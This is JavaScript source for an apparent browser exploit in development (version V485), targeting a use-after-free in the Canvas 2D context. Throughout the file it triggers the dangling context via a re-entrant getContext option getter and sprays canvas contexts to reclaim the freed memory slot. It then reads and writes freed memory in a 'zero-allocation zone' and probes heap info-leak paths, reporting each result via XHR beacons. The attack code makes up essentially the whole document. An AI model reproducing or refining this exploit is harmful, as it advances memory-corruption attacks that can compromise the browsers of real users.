// p485 — Canvas UAF: read freed memory with ZERO allocations between
//
// V484 CRASHED: XHR beacon between UAF and read likely allocated into freed 768B slot,
// corrupting m_stateStack.m_buffer → wild pointer deref on lineWidth read.
//
// FIX: Read ALL properties IMMEDIATELY after UAF, store in pre-allocated vars.
// NO XHR, NO object creation, NO allocation between UAF trigger and reads.
// Property getters (lineWidth, globalAlpha etc.) return NaN-boxed doubles = no allocation.
// danglingCtx.canvas returns existing wrapper = no allocation.
//
// Only AFTER all reads are stored → send beacons with results.
//
// Beacon prefix: V485-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var beaconQueue = [];

  function Q(tag, body) {
    beaconQueue.push([tag, body || '']);
  }

  function flushBeacons() {
    for (var i = 0; i < beaconQueue.length; i++) {
      try {
        var dt = Date.now() - T0;
        var x = new XMLHttpRequest();
        x.open('POST', BASE + '/beacon/V485-' + beaconQueue[i][0], false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + dt + 'ms] ' + beaconQueue[i][1]);
      } catch(e) {}
    }
    beaconQueue = [];
  }

  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V485-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: First UAF → same-type spray (baseline, same as V482)
  // ═══════════════════════════════════════════════════════════
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  document.body.appendChild(tc1);
  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  var sprayC1 = [], sprayX1 = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC1.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 100 + i;
    sprayX1.push(ctx);
  }

  var lw1 = dCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 100 || lw1 >= 300) {
    B('UAF1-MISS', 'lw=' + lw1); B('DONE'); return;
  }
  var idx1 = Math.round(lw1 - 100);
  B('UAF1-ALIAS', 'idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Second UAF → IMMEDIATE read from freed memory
  //
  // CRITICAL: Between the getContext('2d', s2) call that frees C1_2
  // and our reads, we must NOT:
  //   - Send XHR (allocates internal buffers, might reuse 768B slot)
  //   - Create objects (might trigger GC → visitAdditionalChildren crash)
  //   - Call any function that allocates
  //
  // Property getters return NaN-boxed doubles (no heap allocation).
  // danglingCtx.canvas returns an existing wrapper (no new allocation).
  // ═══════════════════════════════════════════════════════════

  // Pre-allocate result storage
  var r_lw = -999, r_ga = -999, r_ml = -999;
  var r_sb = -999, r_sox = -999, r_soy = -999, r_ldo = -999;
  var r_canvasSame = false;
  var r_err = '';
  var r_write_ok = false;
  var r_write_read = -999;
  var r_save_ok = false;
  var r_save_err = '';

  var dCtx2 = null, lCtx2 = null;
  var tc2 = document.createElement('canvas');
  tc2.width = 10; tc2.height = 10;
  document.body.appendChild(tc2);

  var cc2 = 0, s2 = {};
  Object.defineProperty(s2, 'desynchronized', {
    get: function() { cc2++; if (cc2 === 1) dCtx2 = tc2.getContext('2d'); return false; }
  });

  // THIS LINE triggers the UAF: C1_2 created (inner), C2_2 created (outer), C1_2 freed
  lCtx2 = tc2.getContext('2d', s2);

  // ─── ZERO-ALLOCATION ZONE ──────────────────────────────
  // ALL reads happen here. NO XHR. NO object creation.
  // Only NaN-boxed double returns and existing wrapper lookups.

  if (dCtx2) {
    // Read 1: Simple double property getters (safest — no allocation, no pointer deref beyond m_stateStack)
    r_lw = dCtx2.lineWidth;
    r_ga = dCtx2.globalAlpha;
    r_ml = dCtx2.miterLimit;
    r_sb = dCtx2.shadowBlur;
    r_sox = dCtx2.shadowOffsetX;
    r_soy = dCtx2.shadowOffsetY;
    r_ldo = dCtx2.lineDashOffset;

    // Read 2: canvas property — returns existing wrapper (follows m_canvas pointer)
    r_canvasSame = (dCtx2.canvas === tc2);

    // Read 3: Try save() — writes to fixed offset m_unrealizedSaveCount (no pointer deref)
    dCtx2.save();
    r_save_ok = true;

    // Read 4: Try write + readback
    // setLineWidth: realizeSaves (m_unrealizedSaveCount=1 now, will try realizeSavesLoop!)
    // Actually, save() set m_unrealizedSaveCount=1. setLineWidth calls realizeSaves()
    // which calls realizeSavesLoop() which does m_stateStack.append(state())
    // This ALLOCATES (Vector grows). Dangerous!
    // Let's try restore first to reset unrealizedSaveCount
    dCtx2.restore();
    // Now m_unrealizedSaveCount should be 0 again (restore decrements before pop)
    // Actually, restore() when m_unrealizedSaveCount > 0 just decrements it. No pop.
    // So now m_unrealizedSaveCount = 0. Safe for setLineWidth.

    dCtx2.lineWidth = 31337.75;
    r_write_read = dCtx2.lineWidth;
    r_write_ok = (r_write_read === 31337.75);
  } else {
    r_err = 'uaf2-no-ctx';
  }

  // ─── END ZERO-ALLOCATION ZONE ──────────────────────────

  // Now safe to send beacons
  if (r_err) {
    B('UAF2-FAIL', r_err);
    B('DONE');
    return;
  }

  B('FREED-READ', 'lw=' + r_lw + ',ga=' + r_ga + ',ml=' + r_ml);
  B('FREED-PROPS', 'sb=' + r_sb + ',sox=' + r_sox + ',soy=' + r_soy + ',ldo=' + r_ldo);

  if (r_lw === 1 && r_ga === 1 && r_ml === 10) {
    B('FREED-DEFAULTS', 'YES');
  } else {
    B('FREED-NONDEFAULT', 'lw=' + r_lw + ',ga=' + r_ga + ',ml=' + r_ml);
  }

  B('FREED-CANVAS', 'sameAsTrigger=' + r_canvasSame);
  B('FREED-SAVE', 'ok=' + r_save_ok);
  B('FREED-WRITE', 'wrote=31337.75,read=' + r_write_read + ',ok=' + r_write_ok);

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: Hex dump of doubles through freed context
  // Read doubles that correspond to internal State fields.
  // Some fields are right next to pointer fields in the State struct.
  // The doubles themselves don't leak pointers, but we need to map
  // which byte offsets correspond to which properties.
  // ═══════════════════════════════════════════════════════════
  try {
    var propNames = ['lineWidth', 'globalAlpha', 'miterLimit',
                     'shadowBlur', 'shadowOffsetX', 'shadowOffsetY', 'lineDashOffset'];
    var hexParts = [];
    for (var p = 0; p < propNames.length; p++) {
      var val = dCtx2[propNames[p]];
      var buf = new ArrayBuffer(8);
      new Float64Array(buf)[0] = val;
      var bytes = new Uint8Array(buf);
      var hex = '';
      for (var b = 7; b >= 0; b--) hex += ('0' + bytes[b].toString(16)).slice(-2);
      hexParts.push(propNames[p] + '=0x' + hex);
    }
    B('FREED-HEX', hexParts.join(','));
  } catch(e) {
    B('FREED-HEX-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 4: Safe object-creating reads (AFTER beacons, so slot might be reused)
  // These might trigger GC but we've already captured the critical data
  // ═══════════════════════════════════════════════════════════
  try {
    var tm = dCtx2.getTransform();
    B('FREED-TRANSFORM', 'a=' + tm.a + ',b=' + tm.b + ',c=' + tm.c + ',d=' + tm.d + ',e=' + tm.e + ',f=' + tm.f);
  } catch(e) {
    B('FREED-TRANSFORM-ERR', e.message);
  }

  try {
    var attrs = dCtx2.getContextAttributes();
    B('FREED-ATTRS', JSON.stringify(attrs));
  } catch(e) {
    B('FREED-ATTRS-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 5: Same-type spray into second freed slot
  // If we're still alive (GC hasn't crashed us), spray contexts
  // ═══════════════════════════════════════════════════════════
  var sprayC2 = [], sprayX2 = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC2.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX2.push(ctx);
  }

  var lw2 = -1;
  try { lw2 = dCtx2.lineWidth; } catch(e) { B('SPRAY2-ERR', e.message); B('DONE'); return; }

  if (lw2 >= 500 && lw2 < 700) {
    var idx2 = Math.round(lw2 - 500);
    B('UAF2-ALIAS', 'idx=' + idx2);
    dCtx2.lineWidth = 888.5;
    var bidir2 = sprayX2[idx2].lineWidth;
    B('UAF2-BIDIR', 'wrote=888.5,read=' + bidir2 + ',ok=' + (bidir2 === 888.5));
  } else if (r_write_ok && lw2 === 31337.75) {
    B('SPRAY2-MISS', 'slot not reclaimed by spray, still has our written value');
  } else {
    B('SPRAY2-OTHER', 'lw=' + lw2);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 6: Explore info leak vectors via UAF1 aliased pair
  // Use the SAFE aliased pair (idx1) for deeper experiments
  // ═══════════════════════════════════════════════════════════

  // 6A: CanvasGradient through aliased context
  try {
    var grad = sprayX1[idx1].createLinearGradient(0, 0, 100, 100);
    grad.addColorStop(0, 'red');
    grad.addColorStop(1, 'blue');
    sprayX1[idx1].fillStyle = grad;
    var fs_read = dCtx1.fillStyle;
    var fs_type = typeof fs_read;
    var fs_str = '';
    try { fs_str = String(fs_read).substring(0, 60); } catch(e2) {}
    var fs_isGrad = (fs_read === grad);
    B('GRAD-READ', 'type=' + fs_type + ',isGrad=' + fs_isGrad + ',str=' + fs_str);
  } catch(e) {
    B('GRAD-ERR', e.message);
  }

  // 6B: CanvasPattern through aliased context (if Image works)
  try {
    var patCanvas = document.createElement('canvas');
    patCanvas.width = 2; patCanvas.height = 2;
    var patCtx = patCanvas.getContext('2d');
    patCtx.fillStyle = 'red';
    patCtx.fillRect(0, 0, 2, 2);
    var pat = sprayX1[idx1].createPattern(patCanvas, 'repeat');
    sprayX1[idx1].fillStyle = pat;
    var pat_read = dCtx1.fillStyle;
    var pat_type = typeof pat_read;
    var pat_isPat = (pat_read === pat);
    B('PAT-READ', 'type=' + pat_type + ',isPat=' + pat_isPat);
  } catch(e) {
    B('PAT-ERR', e.message);
  }

  // 6C: Grow state stack → observe behavior
  // After 20 save() calls, Vector<State> reallocs to heap
  // The m_buffer pointer changes from inline to heap pointer
  try {
    for (var i = 0; i < 20; i++) sprayX1[idx1].save();
    var post_lw = dCtx1.lineWidth;
    var post_ga = dCtx1.globalAlpha;
    B('STACK-GROW', 'saves=20,lw=' + post_lw + ',ga=' + post_ga);

    // Restore back to baseline
    for (var i = 0; i < 20; i++) sprayX1[idx1].restore();
    var restored_lw = dCtx1.lineWidth;
    B('STACK-RESTORED', 'lw=' + restored_lw);
  } catch(e) {
    B('STACK-ERR', e.message);
  }

  // 6D: setLineDash with array → check getLineDash
  try {
    sprayX1[idx1].setLineDash([1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]);
    var dash = dCtx1.getLineDash();
    B('DASH', 'len=' + dash.length + ',vals=' + Array.prototype.join.call(dash, ','));
  } catch(e) {
    B('DASH-ERR', e.message);
  }

  // 6E: measureText — computed values
  try {
    var mt = dCtx1.measureText('AAAAAA');
    B('MEASURE', 'w=' + mt.width);
  } catch(e) {
    B('MEASURE-ERR', e.message);
  }

  // 6F: Try to observe whether toDataURL/toBlob expose any heap data
  // (unlikely but worth testing)
  try {
    // Fill a canvas through the aliased context, then read pixels
    dCtx1.fillStyle = '#FF0000';
    dCtx1.fillRect(0, 0, 10, 10);
    // Read through liveCtx1 (the non-dangling context on same canvas)
    var imgd = lCtx1.getImageData(0, 0, 10, 10);
    var r0 = imgd.data[0], g0 = imgd.data[1], b0 = imgd.data[2], a0 = imgd.data[3];
    B('PIXELS', 'r=' + r0 + ',g=' + g0 + ',b=' + b0 + ',a=' + a0);
  } catch(e) {
    B('PIXELS-ERR', e.message);
  }

  B('SUMMARY', 'uaf1=' + idx1 + ',freed_lw=' + r_lw + ',freed_ok=' + (r_lw === 1) + ',write_ok=' + r_write_ok);
  B('DONE');
})();
